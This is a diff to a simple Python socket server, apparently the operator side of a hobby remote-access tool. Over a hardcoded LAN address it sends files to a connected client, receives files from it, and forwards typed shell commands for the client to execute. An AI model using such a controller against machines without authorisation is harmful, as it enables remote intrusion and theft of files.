@@ -1,17 +1,19 @@
 import socket
 import threading
 
+# GLOBALS 
 HEADER = 64
 FORMAT = 'utf-8'
 DISCONNECT_MESSAGE = '!disconnect'
 
-PORT = 1234
-SERVER = socket.gethostbyname(socket.gethostname())
+PORT = 7070
+SERVER = '192.168.1.7'
 ADDR = (SERVER, PORT)
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 server.bind(ADDR)
 
+# function to send files 
 def send_file(conn):
     print('sending')
     file_name = input('Enter file name : ')
@@ -22,6 +24,7 @@ def send_file(conn):
     conn.send(f)
     file.close()
 
+# function to recv files
 def recv_file(conn):
     file_name = input('Enter file name : ')
     conn.send(file_name.encode())
@@ -32,18 +35,27 @@ def recv_file(conn):
     f.close()
     print(file)    
 
+# function that accept cmd commands and send it to the client 
 def cmd(conn):
     active = True
     while active:
         command = input('command prompt > ')
         conn.send(command.encode())
+        res = conn.recv(24).decode()
+        if res == '0':
+            print('success')
+        else :
+            print('error')
 
+# connection handler 
 def handle_client(conn, addr):
     print(f"[NEW CONNECTION]  connected")
     connection = True
     while connection:
         massage = input('haha: ')
         conn.send(massage.encode())
+
+        # checking the commands 
         if massage == 'end':
             conn.close()
             connection = False
@@ -55,7 +67,8 @@ def handle_client(conn, addr):
         elif massage == 'cmd':
             cmd(conn)
 
-        
+
+# connection initalizing function      
 def start():
     server.listen(5)
     print(f"[SERVER] server is running on {SERVER}")
